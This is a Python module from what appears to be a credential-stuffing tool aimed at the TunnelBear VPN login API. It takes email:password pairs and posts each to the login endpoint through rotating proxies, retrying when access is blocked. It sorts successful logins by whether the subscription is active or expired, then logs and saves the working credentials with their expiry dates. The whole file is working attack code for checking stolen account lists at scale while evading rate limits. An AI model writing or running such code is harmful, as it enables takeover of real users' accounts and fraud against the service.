from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import post
from datetime import datetime

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        
        data = f"username={email}&password={password}&withUserDetails=true&v=web-1.0"
        headers = {"Content-Type":"application/x-www-form-urlencoded"}
        try:
            response = post("https://www.tunnelbear.com/core/api/login",data=data,headers=headers,proxies=proxy_set,timeout=Checker.timeout)
            if response.status_code == 403 or "Access denied" in response.text:
                retries += 1
            elif '{"result":"PASS"' in response.text:
                expiry = response.json()["details"]["fullVersionUntil"]
                expire = int(datetime.strptime(response.json()["details"]["fullVersionUntil"], '%b %d, %Y %H:%M:%S %p').date().strftime("%Y%m%d"))
                now = int(datetime.now().strftime("%Y%m%d"))
                if now > expire:
                    Checker.custom += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("custom",email+":"+password,"Tunnelbear")
                    save("Tunnelbear","custom",Checker.time,email+":"+password)
                    return
                else:
                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Tunnelbear")
                    save("Tunnelbear","good",Checker.time,email+":"+password+f" | Expire: {expiry}")
                    return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return